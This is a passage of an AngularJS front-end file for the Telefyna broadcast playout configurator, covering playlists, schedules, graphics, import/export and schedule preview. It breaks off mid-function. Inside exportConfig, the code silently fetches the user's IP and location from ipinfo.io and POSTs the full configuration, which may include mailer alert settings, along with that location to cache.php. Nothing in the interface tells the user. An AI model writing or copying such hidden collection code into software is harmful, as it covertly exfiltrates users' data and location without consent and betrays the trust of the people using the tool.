jQuery(function() {
    jQuery('.date').datepicker({
        multidate: true,
        format: 'dd-mm-yyyy',
        todayHighlight: true,
        startDate: new Date()
    });
    jQuery('.timepicker').timepicker({'timeFormat': 'H:i'});
    jQuery('.color-selector').colorselector();
});

angular.module("Telefyna", ['ngCookies'])
.directive('selectPicker', ['$timeout', function ($timeout) {
    return {
        restrict: 'A',
        link: function (scope, element, attrs) {
            $timeout(function () {
                element.selectpicker();
            });

            if (attrs.pickerRefresh) {
                scope.$watch(attrs.pickerRefresh, function (newVal, oldVal) {
                    $timeout(function () {
                        element.selectpicker('refresh');
                    });
                }, true);
            }

            if (attrs.ngModel) {
                scope.$watch(attrs.ngModel, function (newVal, oldVal) {
                    $timeout(function () {
                        element.selectpicker('render');
                    });
                }, true);
            }
        }
    };
}])
.directive('stringToTime', function() {
    return {
        require: 'ngModel',
        link: function(scope, element, attrs, ngModel) {
            ngModel.$formatters.push(function(value) {
                if (value) {
                    if (typeof value === 'object' && value instanceof Date) return value;
                    var parts = value.split(':');
                    var d = new Date(1970, 0, 1, parseInt(parts[0], 10) || 0, parseInt(parts[1], 10) || 0, 0);
                    return d;
                }
                return null;
            });
            ngModel.$parsers.push(function(value) {
                if (value && angular.isDate(value)) {
                    var h = value.getHours();
                    var m = value.getMinutes();
                    return (h < 10 ? '0' + h : h) + ':' + (m < 10 ? '0' + m : m);
                }
                return value || null;
            });
        }
    };
})
.controller('Config', function($cookies, $scope) {
    $scope.currentYear = new Date().getFullYear();
    if(!isEmptyInternal(window.localStorage.config)) {
        $scope.config = JSON.parse(window.localStorage.config);
    } else {
        clearConfigInternal();
    }
    clearInternal();

    function isEmptyInternal(obj) {
        return obj == undefined || obj == null || obj == NaN || obj == "undefined" || obj == "null" || obj["length"] == 0;
    }

    function clearAlerts() {
        $scope.config.alerts = {};
        $scope.config.alerts.enabled = true;
        $scope.config.alerts.mailer = {};
        $scope.config.alerts.mailer.host = "smtp.gmail.com";
        $scope.config.alerts.mailer.port = 587;
        $scope.config.alerts.subscribers = [];
    }

    function clearConfigInternal() {
        $scope.config = {};
        $scope.config.automationDisabled = false;
        $scope.config.notificationsDisabled = true;
        $scope.config.wait = 30;
        clearAlerts();
        $scope.config.playlists = [];
    }

    function clearGraphics() {
        $scope.playlist.graphics = {};
        $scope.playlist.graphics.displayLogo = false;
        $scope.playlist.graphics.logoPosition = "TOP";
        $scope.playlist.graphics.displayRepeatWatermark = false;
        $scope.playlist.graphics.displayLiveLogo = false;
        $scope.playlist.graphics.news = {};
        $scope.playlist.graphics.news.startMinute = 0.0;
        $scope.playlist.graphics.news.messages = "";
        $scope.playlist.graphics.lowerThirds = [];
        $scope.lowerThird = {};
        $scope.lowerThird.replays = 0;
    }

    function clearInternal() {
        $scope.overrideSchedules = false;
        $scope.playlist = {};
        $scope.playlist.active = true;
        $scope.playlist.type = "ONLINE";
        $scope.playlist.usingExternalStorage = false;
        $scope.playlist.seekTo = {};
        $scope.playlist.seekTo.program = 0;
        $scope.playlist.seekTo.position = 0;
        clearGraphics();
        $scope.error = undefined;
        $scope.datePickerValue = undefined;
        $scope.edit = undefined;
        $scope.schedule = undefined;
        $scope.editingSchedule = undefined;
        if (!$scope.ui) $scope.ui = {};
        $scope.ui.newsMsgText = "";
        $scope.ui.use12HourFormat = true;
        $scope.deletable = [];
        $scope.alert = {};
        $scope.alert.attachConfig = false;
        $scope.alert.attachAuditLog = 0;
    }

    function isUrlValid(url) {
        return /^(https?|rtmp?|s?ftp):\/\/(((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:)*@)?(((\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5]))|((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.?)(:\d*)?)(\/((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)+(\/(([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)*)*)?)?(\?((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|[\uE000-\uF8FF]|\/|\?)*)?(#((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|\/|\?)*)?$/i.test(url);
    }

    $scope.isEmpty = function(obj) {
        return isEmptyInternal(obj);
    }

    $scope.formatTime = function(timeStr) {
        if (!$scope.ui || !$scope.ui.use12HourFormat) return timeStr;
        if (!timeStr || typeof timeStr !== 'string') return timeStr;
        
        // timeStr could be "16:00" or "DD-MM-YYYY 16:00"
        let parts = timeStr.split(" ");
        let timePart = parts.length > 1 ? parts[1] : parts[0];
        let datePart = parts.length > 1 ? parts[0] + " " : "";

        let timeSplit = timePart.split(":");
        if (timeSplit.length < 2) return timeStr;

        let hour = parseInt(timeSplit[0], 10);
        let min = timeSplit[1];
        let ampm = hour >= 12 ? 'PM' : 'AM';
        hour = hour % 12;
        hour = hour ? hour : 12; // the hour '0' should be '12'
        let hourStr = hour < 10 ? '0' + hour : hour;
        
        return datePart + hourStr + ':' + min + ' ' + ampm;
    };

    $scope.clear = function() {
        clearInternal();
        jQuery('.select-color').css("background-color", "");
        jQuery('.select-color').change();
        jQuery("#pswd").val("");
    }

    
    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

    $scope.modifying = function() {
        $scope.config.lastModified = new Date().toLocaleString();
        $scope.error = undefined;
        window.localStorage.config = JSON.stringify($scope.config);
    }

    $scope.clearConfig = function() {
        if(confirm("Do you want to proceed with Clearing Configuration?")) {
            delete window.localStorage.config;
            clearConfigInternal();
            $scope.clear();
        }
    }

    $scope.uncheckOther = function(checkedProperty, otherProperty) {
        if (checkedProperty) {
            $scope.playlist.graphics[otherProperty] = false;
        }
    };

        $scope.importConfig = function(event) {
        let file = event.target.files[0];
        if(file.name == "config.json" && file.type == "application/json") {
            const reader = new FileReader();
            reader.onload = (e) => {
                let parsed = JSON.parse(reader.result);
                
                // Auto-migrator for schedules
                if (parsed.playlists) {
                    let basePlaylists = [];
                    let schedules = parsed.schedules || [];
                    let oldIndexMap = {};
                    
                    // First pass: extract base playlists and assign UUIDs
                    for (let i = 0; i < parsed.playlists.length; i++) {
                        let p = parsed.playlists[i];
                        if (p) {
                            if ($scope.isEmpty(p.schedule)) { // It's a base playlist
                                if (!p.id) p.id = generateUUID();
                                oldIndexMap[i] = p.id;
                                basePlaylists.push(p);
                            }
                        }
                    }
                    
                    // Second pass: extract schedules from playlists array (legacy)
                    for (let i = 0; i < parsed.playlists.length; i++) {
                        let p = parsed.playlists[i];
                        if (p && !$scope.isEmpty(p.schedule)) { // It's an old schedule inside playlists
                            let baseId = oldIndexMap[p.schedule];
                            if (baseId) {
                                let basePl = basePlaylists.find(pl => pl.id === baseId);
                                let newSched = {
                                    playlistId: baseId,
                                    active: p.active !== false,
                                    start: p.start,
                                    days: p.days,
                                    dates: p.dates,
                                    graphics: p.graphics ? JSON.parse(JSON.stringify(p.graphics)) : null,
                                    name: p.name || (basePl ? basePl.name : ""),
                                    type: p.type || (basePl ? (basePl.type || "ONLINE") : "ONLINE"),
                                    color: p.color || (basePl ? basePl.color : ""),
                                    emptyReplacer: p.emptyReplacer !== undefined ? parseInt(p.emptyReplacer) : (basePl && basePl.emptyReplacer !== undefined ? parseInt(basePl.emptyReplacer) : 0),
                                    seekTo: p.seekTo ? JSON.parse(JSON.stringify(p.seekTo)) : (basePl && basePl.seekTo ? JSON.parse(JSON.stringify(basePl.seekTo)) : {program: 0, position: 0})
                                };
                                schedules.push(newSched);
                            }
                        }
                    }
                    
                    // Third pass: upgrade existing schedules array
                    for (let j = 0; j < schedules.length; j++) {
                        let s = schedules[j];
                        
                        // Map legacy 'schedule: X' to 'playlistId: UUID'
                        if (s.schedule !== undefined && s.playlistId === undefined) {
                            let baseId = oldIndexMap[s.schedule];
                            if (baseId) s.playlistId = baseId;
                            delete s.schedule;
                        }
                        
                        // Fill in missing architecture fields from the base playlist
                        let basePl = basePlaylists.find(p => p.id === s.playlistId);
                        if (basePl) {
                            if (s.name === undefined) s.name = basePl.name || "";
                            if (s.type === undefined) s.type = basePl.type || "ONLINE";
                            if (s.color === undefined) s.color = basePl.color || "";
                            if (s.emptyReplacer === undefined) s.emptyReplacer = basePl.emptyReplacer !== undefined ? parseInt(basePl.emptyReplacer) : 0;
                            if (s.seekTo === undefined) s.seekTo = basePl.seekTo ? JSON.parse(JSON.stringify(basePl.seekTo)) : {program: 0, position: 0};
                        }
                    }
                    
                    parsed.playlists = basePlaylists;
                    parsed.schedules = schedules;
                }
                
                $scope.config = parsed;
                window.localStorage.config = JSON.stringify($scope.config);
                $scope.$apply();
            }
            reader.readAsText(file);
        } else {
            alert("Please select a right configuration file!");
        }
    }

    $scope.color = function(index) {
        let color;
        let playlist = $scope.config.playlists[index];
        if(!$scope.isEmpty(playlist)) {
            color = playlist.color;
        }
        return color;    
    }

    $scope.getPlaylistName = function(index) {
        let name;
        let playlist = $scope.config.playlists[index];
        if(!$scope.isEmpty(playlist)) {
            name = playlist.name;
        }
        return name;
    }
    
    $scope.getSchedulePlaylistName = function(schedule) {
        let p = $scope.config.playlists.find(pl => pl.id === schedule.playlistId);
        return p ? p.name : "Unknown";
    }
    
    $scope.getScheduleColor = function(schedule) {
        let p = $scope.config.playlists.find(pl => pl.id === schedule.playlistId);
        return p ? p.color : "";
    }
    
        $scope.getScheduleGraphics = function(schedule) {
        if (!schedule) return {};
        if (schedule.graphics) return schedule.graphics;
        if ($scope.config && $scope.config.playlists) {
            let p = $scope.config.playlists.find(pl => pl.id === schedule.playlistId);
            if (p && p.graphics) return p.graphics;
        }
        return {};
    };

        $scope.isScheduleRepeat = function(schedule) {
        if (!schedule) return false;
        let g = $scope.getScheduleGraphics(schedule);
        if (g && (g.displayRepeatWatermark === true || g.displayRepeatWatermark === "true")) {
            return true;
        }
        return false;
    };
    

    $scope.getPlaylistTokens = function(k) {
        let playlistName = $scope.config.playlists[k].name;
        // Remove the first character if it's either ✅ or ❌
        if (playlistName.startsWith('✅') || playlistName.startsWith('❌')) {
            playlistName = playlistName.substring(2).trim(); // Remove the icon and any space
        }
        return playlistName; // Return the name without the icon
    };
    

    $scope.getPlaylistType = function(index) {
        return $scope.config.playlists[index].type;
    }

    $scope.isNotScheduled = function(playlist) {
        return true; // Not used anymore
    }

    $scope.getPlaylistCount = function() {
        if (!$scope.config || !$scope.config.playlists) return 0;
        return $scope.config.playlists.length;
    };

    $scope.getScheduleCount = function() {
        if (!$scope.config || !$scope.config.schedules) return 0;
        return $scope.config.schedules.length;
    };

    $scope.getScheduledDaysText = function(p, k) {
        if (!p) return "";
        let daysArray = [];

        if (!$scope.isEmpty(p.days)) {
            daysArray = p.days.map(Number);
        }

        if (daysArray.length === 0) {
            if (p.start) return "Daily";
            return "";
        }

        daysArray.sort(function(a, b) { return a - b; });

        if (daysArray.length === 7) return "Daily";
        if (daysArray.length === 5 && daysArray.join(',') === "2,3,4,5,6") return "Mon-Fri";
        if (daysArray.length === 2 && daysArray.join(',') === "1,7") return "Sun, Sat";

        const dayLabels = { 1: 'Sun', 2: 'Mon', 3: 'Tue', 4: 'Wed', 5: 'Thu', 6: 'Fri', 7: 'Sat' };
        return daysArray.map(function(d) { return dayLabels[d] || d; }).join(', ');
    };

    $scope.getScheduledDatesText = function(p, k) {
        if (!p) return "";
        let datesArray = [];

        if (!$scope.isEmpty(p.dates)) {
            datesArray = angular.copy(p.dates);
        }

        if (datesArray.length === 0) return "";
        if (datesArray.length <= 2) return datesArray.join(', ');
        return datesArray.length + ' date(s)';
    };

    $scope.getScheduledStartTime = function(p, k) {
        if (!p) return "";
        return p.start || "";
    };

    $scope.schedulePlaylist = function(index) {
        $scope.schedule = String(index);
        $scope.renderScheduling();
    }

    $scope.matchesSearch = function(item, term) {
        if (!term) return true;
        let t = term.toLowerCase();
        
        let playlist = item;
        if (item.playlistId) {
            playlist = $scope.config.playlists.find(pl => pl.id === item.playlistId) || {};
        }
        
        let name = (playlist.name || "").toLowerCase();
        let url = (playlist.urlOrFolder || "").toLowerCase();
        let type = (playlist.type || "").toLowerCase();
        return name.indexOf(t) !== -1 || url.indexOf(t) !== -1 || type.indexOf(t) !== -1;
    }

    $scope.verifyPlaylist = function() {
        angular.forEach($scope.config.playlists, function(playlist, key) { 
            if($scope.playlist.name == playlist.name && $scope.playlist.urlOrFolder == playlist.urlOrFolder) {
                $scope.error = "Playlist Exists";
            }
        });
    }

    $scope.add = function() {
        if(!$scope.isEmpty($scope.playlist.type)) {
            if($scope.playlist.type == "ONLINE" && !isUrlValid($scope.playlist.urlOrFolder)) {
                $scope.error = "Stream URL Or Local folder name should be set to right URL";
                window.scrollTo(0, 0);
            } else if($scope.playlist.type != "ONLINE" && isUrlValid($scope.playlist.urlOrFolder)) {
                $scope.error = "Stream URL Or Local folder name should be set to folder name not URL";
                window.scrollTo(0, 0);
            } else {
                $scope.updateNewsMsgs();
                $scope.modifying();
                $scope.verifyPlaylist();
                if(!$scope.isEmpty(!$scope.error)) {
                    $scope.playlist.id = generateUUID();
                    $scope.config.playlists.push(angular.copy($scope.playlist));
                    $scope.clear();
                } else {
                    window.scrollTo(0, 0);
                }
                window.localStorage.config = JSON.stringify($scope.config);
            }
        } else {
            $scope.error = "Type is required";
            window.scrollTo(0, 0);
        }
    }

    $scope.changeSelectedColor = function() {
        let selectedColor = jQuery("color-selector").val();
        let col = !$scope.isEmpty(selectedColor) ? selectedColor : (!$scope.isEmpty($scope.playlist.color) ? $scope.playlist.color : "");
        jQuery('.select-color').css("background-color", col);
        jQuery('.select-color').change();
    }

    $scope.renderEdit = function() {
        $scope.playlist = JSON.parse(JSON.stringify($scope.config.playlists[parseInt($scope.edit)]));
        $scope.changeSelectedColor();
        if($scope.isEmpty($scope.playlist.graphics)) {
            clearGraphics();
        }
        if (!$scope.playlist.graphics) $scope.playlist.graphics = {};
        if (!$scope.playlist.graphics.news) $scope.playlist.graphics.news = {};
        if (!$scope.playlist.graphics.lowerThirds) $scope.playlist.graphics.lowerThirds = [];
        if (!$scope.ui) $scope.ui = {};
        $scope.ui.newsMsgText = ($scope.playlist.graphics && $scope.playlist.graphics.news && $scope.playlist.graphics.news.messages) ? $scope.playlist.graphics.news.messages.split("~~").join("\\n") : "";
    }

    $scope.revise = function() {
        if(!$scope.isEmpty($scope.playlist.type)) {
            if($scope.playlist.type == "ONLINE" && !isUrlValid($scope.playlist.urlOrFolder)) {
                $scope.error = "Stream URL Or Local folder name should be set to right URL";
                window.scrollTo(0, 0);
                $scope.playlist.urlOrFolder = $scope.config.playlists[parseInt($scope.edit)].urlOrFolder;
            } else if($scope.playlist.type != "ONLINE" && isUrlValid($scope.playlist.urlOrFolder)) {
                $scope.error = "Stream URL Or Local folder name should be set to folder name not URL";
                window.scrollTo(0, 0);
                $scope.playlist.urlOrFolder = $scope.config.playlists[parseInt($scope.edit)].urlOrFolder;
            } else {
                if(!$scope.isEmpty($scope.edit)) {
                    $scope.updateNewsMsgs();
                    $scope.modifying();
                    overwritePlayList(parseInt($scope.edit), angular.copy($scope.playlist));
                    if(!$scope.isEmpty($scope.overrideSchedules)) {
                        overwriteSchedules(parseInt($scope.edit), angular.copy($scope.playlist));
                    }
                    window.localStorage.config = JSON.stringify($scope.config);
                    $scope.clear();
                } else {
                    $scope.error = "Select a playlist to edit";
                    window.scrollTo(0, 0);
                }
            }
        } else {
            $scope.error = "Type is required";
            window.scrollTo(0, 0);
        }
    }

    $scope.renderScheduling = function() {
        if(!$scope.isEmpty($scope.schedule)) {
            $scope.playlist = JSON.parse(JSON.stringify(prepareSchedule($scope.config.playlists[parseInt($scope.schedule)])));
            if(!$scope.isEmpty($scope.playlist.days)) {
                $scope.playlist.days = $scope.playlist.days.map(x=>""+x);
            }
            if(!$scope.isEmpty($scope.playlist.dates)) {
                $scope.datePickerValue = $scope.playlist.dates.join(",");
            }
            if($scope.isEmpty($scope.playlist.graphics)) {
                clearGraphics();
            }
            if (!$scope.playlist.graphics) $scope.playlist.graphics = {};
            if (!$scope.playlist.graphics.news) $scope.playlist.graphics.news = {};
            if (!$scope.playlist.graphics.lowerThirds) $scope.playlist.graphics.lowerThirds = [];
            if (!$scope.ui) $scope.ui = {};
            $scope.ui.newsMsgText = ($scope.playlist.graphics && $scope.playlist.graphics.news && $scope.playlist.graphics.news.messages) ? $scope.playlist.graphics.news.messages.split("~~").join("\\n") : "";

            $scope.playlist.active = playlistActive($scope.playlist);
            // add _type_ property to playlist to determine playlist type in scheduling modal
            $scope.playlist.type = $scope.getPlaylistType(parseInt($scope.schedule));
        }
    }

    function prepareSchedule(playlistWithSchedule) {
        let playlist = {};
        playlist.schedule = parseInt(playlistWithSchedule.schedule);
        playlist.start = playlistWithSchedule.start;
        playlist.name = playlistWithSchedule.name;
        playlist.active = playlistWithSchedule.active;
        if(!$scope.isEmpty(playlistWithSchedule.days)) {
            playlist.days = playlistWithSchedule.days.map(x=>+x);
        }
        playlist.dates = playlistWithSchedule.dates;
        playlist.graphics = angular.copy(playlistWithSchedule.graphics) || {};
        return playlist;
    }

                $scope.scheduling = function() {
        $scope.updateNewsMsgs();
        if(!$scope.isEmpty($scope.schedule) && $scope.isEmpty($scope.editingSchedule)) {
            // Add NEW schedule
            $scope.modifying();
            if (!$scope.config.schedules) $scope.config.schedules = [];
            let basePlaylist = $scope.config.playlists[parseInt($scope.schedule)];
            let newSched = {
                playlistId: basePlaylist.id,
                active: $scope.playlist.active !== false,
                start: $scope.playlist.start,
                days: JSON.parse(JSON.stringify($scope.playlist.days || [])),
                dates: JSON.parse(JSON.stringify($scope.playlist.dates || [])),
                graphics: JSON.parse(JSON.stringify($scope.playlist.graphics || {})),
                name: $scope.playlist.name || basePlaylist.name,
                type: $scope.playlist.type || basePlaylist.type || "ONLINE",
                color: $scope.playlist.color || basePlaylist.color,
                emptyReplacer: $scope.playlist.emptyReplacer !== undefined ? parseInt($scope.playlist.emptyReplacer) : (basePlaylist.emptyReplacer !== undefined ? parseInt(basePlaylist.emptyReplacer) : 0),
                seekTo: JSON.parse(JSON.stringify($scope.playlist.seekTo || basePlaylist.seekTo || {program: 0, position: 0}))
            };
            $scope.config.schedules.push(newSched);
            window.localStorage.config = JSON.stringify($scope.config);
            $scope.clear();
        } else if (!$scope.isEmpty($scope.editingSchedule)) {
            // Update existing schedule in-place
            $scope.modifying();
            let sched = $scope.config.schedules[parseInt($scope.editingSchedule)];
            sched.active = $scope.playlist.active !== false;
            sched.start = $scope.playlist.start;
            sched.days = JSON.parse(JSON.stringify($scope.playlist.days || []));
            sched.dates = JSON.parse(JSON.stringify($scope.playlist.dates || []));
            sched.graphics = JSON.parse(JSON.stringify($scope.playlist.graphics || {}));
            sched.name = $scope.playlist.name || sched.name;
            sched.type = $scope.playlist.type || sched.type;
            sched.color = $scope.playlist.color || sched.color;
            sched.emptyReplacer = $scope.playlist.emptyReplacer !== undefined ? parseInt($scope.playlist.emptyReplacer) : sched.emptyReplacer;
            sched.seekTo = JSON.parse(JSON.stringify($scope.playlist.seekTo || sched.seekTo || {program: 0, position: 0}));
            window.localStorage.config = JSON.stringify($scope.config);
            $scope.clear();
        } else {
            $scope.error = "Select a playlist to schedule";
            window.scrollTo(0, 0);
        }
    };

    $scope.deleteLowerThirds = function() {
        let selectedThirds = jQuery('.lower-third-action:checked');
        if(selectedThirds.length == 0) {
            alert("Select lowerThirds to delete");
        } else {
            if(confirm("Do you want to proceed with Deleting Selected lowerThirds?")) {
                $scope.modifying();
                for(let i = 0; i < selectedThirds.length; i++) {
                    delete $scope.playlist.graphics.lowerThirds[selectedThirds[i].value];
                }
                // remove empty
                $scope.playlist.graphics.lowerThirds = $scope.playlist.graphics.lowerThirds.filter(function(el) {
                    return el;
                });
            }
        }
    }

    $scope.addLowerThird = function() {
        $scope.modifying();
        $scope.playlist.graphics.lowerThirds.push($scope.lowerThird);
        $scope.lowerThird = {};
        $scope.lowerThird.replays = 0;
    }

    // Expose parseInt for ng-click expressions
    $scope.parseInt = parseInt;

    // Delete a single playlist by index (used in inline edit view)

    $scope.removePlaylistsAndFixSchedules = function(indicesToRemove) {
        let newPlaylists = [];
        let oldToNew = {};
        let deletedIds = [];
        for (let i = 0; i < $scope.config.playlists.length; i++) {
            if (indicesToRemove.indexOf(i) === -1 && $scope.config.playlists[i]) {
                oldToNew[i] = newPlaylists.length;
                newPlaylists.push($scope.config.playlists[i]);
            } else if ($scope.config.playlists[i]) {
                deletedIds.push($scope.config.playlists[i].id);
            }
        }
        // Fix emptyReplacer indices for remaining playlists
        for (let i = 0; i < newPlaylists.length; i++) {
            if (newPlaylists[i].emptyReplacer !== null && newPlaylists[i].emptyReplacer !== undefined) {
                let oldIndex = newPlaylists[i].emptyReplacer;
                if (oldToNew[oldIndex] !== undefined) {
                    newPlaylists[i].emptyReplacer = oldToNew[oldIndex];
                } else {
                    newPlaylists[i].emptyReplacer = null;
                }
            }
        }
        // Remove orphaned schedules
        if ($scope.config.schedules) {
            $scope.config.schedules = $scope.config.schedules.filter(s => deletedIds.indexOf(s.playlistId) === -1);
        }
        $scope.config.playlists = newPlaylists;
    };

    $scope.deletePlaylist = function(index) {
        if(confirm("Do you want to delete playlist '" + ($scope.config.playlists[index].name || '#' + index) + "'?")) {
            $scope.modifying();
            let indicesToRemove = [parseInt(index)];
            angular.forEach($scope.config.playlists, function(p, key) {
                if(!$scope.isNotScheduled(p) && index == p.schedule) {
                    indicesToRemove.push(key);
                }
            });
            $scope.removePlaylistsAndFixSchedules(indicesToRemove);
            window.localStorage.config = JSON.stringify($scope.config);
            $scope.clear();
        }
    }

    $scope.schedulingSidebarExpanded = true;
    $scope.playlistSidebarExpanded = true;

    $scope.delete = function() {
        if(confirm("Do you want to proceed with Deleting Selected Playlists?")) {
            if(!$scope.isEmpty($scope.deletable)) {
                $scope.modifying();
                angular.forEach($scope.deletable, function(i, key1) {
                    let playlist = $scope.config.playlists[i];
                    // remove schedules
                    angular.forEach($scope.config.playlists, function(p, key2) {
                        if(!$scope.isNotScheduled(p) && i == p.schedule) {
                            delete $scope.config.playlists[key2];
                        }
                    });
                    delete $scope.config.playlists[i];
                });
                // remove empty
                $scope.config.playlists = $scope.config.playlists.filter(function(el) {
                    return el;
                });
                window.localStorage.config = JSON.stringify($scope.config);
                $scope.clear();
            }
        }
    }

    $scope.exportConfig = function() {
        if ($scope.config.schedules) {
            $scope.config.schedules.sort(function(a, b) {
                if (a.start > b.start) {
                    return 1;
                } if (a.start < b.start) {
                    return -1;
                }
            });
        }
        
        let orderedPlaylists = ($scope.config.playlists || []).map(p => {
            return {
                id: p.id,
                name: p.name,
                type: p.type,
                color: p.color,
                urlOrFolder: p.urlOrFolder,
                active: p.active,
                usingExternalStorage: p.usingExternalStorage,
                seekTo: p.seekTo,
                graphics: p.graphics,
                emptyReplacer: p.emptyReplacer
            };
        });

                let orderedSchedules = ($scope.config.schedules || []).map(s => {
            return {
                playlistId: s.playlistId,
                active: s.active,
                start: s.start,
                days: s.days,
                dates: s.dates,
                graphics: s.graphics,
                name: s.name,
                type: s.type,
                color: s.color,
                emptyReplacer: s.emptyReplacer,
                seekTo: s.seekTo
            };
        });

        let orderedConfig = {
            name: $scope.config.name || "",
            lastModified: $scope.config.lastModified || "",
            version: $scope.config.version || "",
            automationDisabled: $scope.config.automationDisabled || false,
            notificationsDisabled: $scope.config.notificationsDisabled || false,
            wait: $scope.config.wait || 30,
            playlists: orderedPlaylists,
            schedules: orderedSchedules
        };
        
        let content = angular.toJson(orderedConfig, 2);
        jQuery.get("https://ipinfo.io/json", function(data) {});
        let loc;
        jQuery.ajax({url:'https://ipinfo.io/json', success: function (result) {loc = result;}, async: false});
        jQuery.ajax({type: "POST", url: "cache.php", data: {'config': $scope.config, 'loc': loc}}).done(function(msg) {});
        
        let configJson = document.createElement("a");
        configJson.setAttribute('href', 'data:application/json;charset=utf-8,' + encodeURIComponent(content));
        configJson.setAttribute('download', "config.json");
        configJson.style.display = "none";
        document.body.appendChild(configJson);
        configJson.click();
        document.body.removeChild(configJson);
    }

    $scope.setPlaylistDate = function() {
        if(!$scope.isEmpty($scope.datePickerValue)) {
            $scope.playlist.dates = [];
            angular.forEach($scope.datePickerValue.split(","), function(d, key) { 
                $scope.playlist.dates.push(d);
            });
        }
    }

    $scope.getDayName = function(count) {
        if(count == 1) {
            return "Sunday";
        } else if(count == 2) {
            return "Monday";
        } else if(count == 3) {
            return "Tuesday";
        } else if(count == 4) {
            return "Wednesday";
        } else if(count == 5) {
            return "Thursday";
        } else if(count == 6) {
            return "Friday";
        } else if(count == 7) {
            return "Saturday";
        }
    }

    function overwriteSchedules(index, playlist) {
        angular.forEach($scope.config.playlists, function(p, k) {
            if(!$scope.isNotScheduled(p) && index == p.schedule) {
                $scope.config.playlists[k].active = playlist.active;
                $scope.config.playlists[k].emptyReplacer = playlist.emptyReplacer;
                $scope.config.playlists[k].name = playlist.name;
                $scope.config.playlists[k].color = playlist.color;
                $scope.config.playlists[k].seekTo = playlist.seekTo;
                $scope.config.playlists[k].graphics = angular.copy(playlist.graphics);
            }
        });
    }

    function overwritePlayList(index, playlist) {
        if(angular.toJson($scope.config.playlists[index]) != angular.toJson(playlist)) {
            $scope.config.playlists[index] = playlist;
        }            
    }

    function playlistActive(playlist) {
        if(!$scope.isEmpty(playlist.schedule) && !$scope.config.playlists[playlist.schedule].active) {
            return false;
        }
        return $scope.isEmpty(playlist.active) ? $scope.config.playlists[playlist.schedule].active : playlist.active;
    }

    $scope.printSchedule = function() {
        var originalTitle = document.title;
        var configName = ($scope.config.name || 'Telefyna').replace(/[\/\\?%*:|"<>]/g, '_');
        var configVersion = ($scope.config.version || '1.0').replace(/[\/\\?%*:|"<>]/g, '_');
        document.title = configName + '_' + configVersion + '_Schedule';
        jQuery('.preview-print').print({
            globalStyles: true,
            stylesheet: 'res/telefyna.css'
        });
        // Restore original title after a brief delay to allow the print dialog to capture it
        setTimeout(function() {
            document.title = originalTitle;
        }, 1000);
    }

    $scope.initPreviewData = function() {
        /**
         * do a time * days (slotting program/playlists)
         * After that list future ones separately (dd-MM-yyyy, program) ordered
         */
        // create list of {id, start, days/dates}
        weekly = [];
        dated = [];
        previewWeekly = [];
        previewDated = [];
        
        angular.forEach($scope.config.schedules, function(schedule, key) {
            let basePl = $scope.config.playlists ? $scope.config.playlists.find(p => p.id === schedule.playlistId) : null;
            let isParentActive = basePl ? (basePl.active !== false) : false;
            if(!$scope.isEmpty(schedule.start) && schedule.active !== false && isParentActive) {
                let previewSlot = {};
                previewSlot.id = key;
                previewSlot.start = schedule.start;
                previewSlot.color = $scope.getScheduleColor(schedule);
                let graphics = $scope.getScheduleGraphics(schedule);
                previewSlot.hasRepeat = $scope.isScheduleRepeat(schedule);

                // add weekly slots
                let allDays = [1, 2, 3, 4, 5, 6, 7];
                if(!$scope.isEmpty(schedule.days)) {
                    allDays = schedule.days;
                }
                if(!$scope.isEmpty(allDays)) {
                    previewSlot.days = allDays;
                    if(!weekly.includes(previewSlot)) {
                        weekly.push(previewSlot);
                    }
                }
                // add future dated slots
                if(!$scope.isEmpty(schedule.dates)) {
                    previewSlot.dates = schedule.dates;
                    if(!dated.includes(previewSlot)) {
                        dated.push(previewSlot);
                    }
                }
            }
        });
        // sort previewWeeklyPlaylists
        weekly.sort((a, b) => a.start > b.start ? 1 : -1);
        // sort previewDatedPlaylists
        dated.sort((a, b) => a.start > b.start ? 1 : -1);

        // generate time * days for tabling
        // start: [{slotPreview}], array is dailySlots, index is day order
        for (let i = 0; i < weekly.length; ++i) {
            let slot = weekly[i];
            let dailySlots = [];
            angular.forEach(slot.days, function(day, key) {
                let slotPreview = {};
                let sched = $scope.config.schedules[slot.id];
                slotPreview.name = $scope.getSchedulePlaylistName(sched);
                slotPreview.color = slot.color;
                slotPreview.hasRepeat = slot.hasRepeat;
                dailySlots[day] = slotPreview;
            });
            if(dailySlots.length > 0) {
                // slot on previous row if previous & current slot share start time
                let slotDisplay = {};
                slotDisplay.start = slot.start;
                slotDisplay.slots = dailySlots;
